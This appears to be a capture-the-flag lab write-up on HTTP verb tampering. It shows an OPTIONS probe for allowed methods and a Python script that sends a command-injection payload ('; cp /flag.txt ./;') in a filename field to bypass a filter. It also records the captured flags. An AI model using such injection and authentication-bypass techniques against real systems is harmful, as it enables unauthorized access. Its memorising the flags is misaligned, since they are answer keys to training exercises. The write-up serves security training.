# Http Verb Tampering

## First module:

### Bypass Authentication.

Once we have a single page, we can just try to change the request method
you can view in the headers if the site allows any other methods like:
POST
GET
PUT
DELETE
HEAD

```bash
curl -s -i -X OPTIONS "https://server:port/"
```
For this example, we tried using the changed method as we mentioned above,
and we got bypass the authentication performing the method changed
and of course get the flag. HTB{4lw4y5_c0v3r_4ll_v3rb5}

```html
<div></div><ul id="file">HTB{4lw4y5_c0v3r_4ll_v3rb5}<div><h3>Available Files:<h3></div></ul></div>
```

## Second module.

### Bypassing Security Filters.


The other and more common type of HTTP Verb Tampering vulnerability
is caused by Insecure Coding errors made during the development of the
web application, which lead to web application not covering all HTTP
methods in certain functionalities. This is commonly found in security 
filters that detect malicious requests. For example, if a security filter
was being used to detect injection vulnerabilities and only checked for
injections in POST parameters (e.g. $_POST['parameter']), it may be
possible to bypass it simply changing the request method to GET.

For this module, to get the bypass, we use the following code snippet

```python
#!/usr/bin/python3

import requests
import sys


def main():
    try:
        url = "http://46.101.14.124:32738/index.php"
        payload = "test1%3B+cp+/flag.txt+./%3B"
        print(payload)
        response = requests.post(url=url, data={"filename": payload})
        # print(response.text)
        print(response.url)
    except Exception as e:
        print(str(e))
        sys.exit(1)
    except KeyboardInterrupt:
        print(str("""\n\t\t [*] Exiting..."""))
        sys.exit(0)


if __name__ == "__main__":
    main()
```
The flag is: "HTB{b3_v3rb_c0n51573n7}"
